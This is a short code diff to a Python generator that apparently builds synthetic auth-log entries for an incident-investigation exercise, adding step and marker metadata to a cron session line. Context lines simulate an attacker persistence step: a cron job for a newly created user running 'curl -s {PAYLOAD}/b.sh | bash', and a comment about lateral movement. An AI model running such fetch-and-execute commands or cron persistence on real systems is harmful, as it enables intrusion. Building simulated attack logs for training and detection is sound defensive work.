@@ -91,7 +91,8 @@ def build(rng: random.Random, hard: bool, skew: int) -> list[Entry]:
         out.append(auth(run, f"CRON[{p}]", pre, step=4, marker=f"CRON[{p}]: pam_unix(cron:session): session opened"))
         out.append(auth(run, f"CRON[{p}]", f"({NEW_USER}) CMD (curl -s {PAYLOAD}/b.sh | bash)",
                         step=4, marker=f"CRON[{p}]: ({NEW_USER}) CMD"))
-        out.append(auth(run, f"CRON[{p}]", f"pam_unix(cron:session): session closed for user {NEW_USER}"))
+        out.append(auth(run, f"CRON[{p}]", f"pam_unix(cron:session): session closed for user {NEW_USER}",
+                        step=4, marker=f"CRON[{p}]: pam_unix(cron:session): session closed"))
         last_run, run = run, run + timedelta(minutes=5)
 
     # 5 lateral movement on ws-fin01
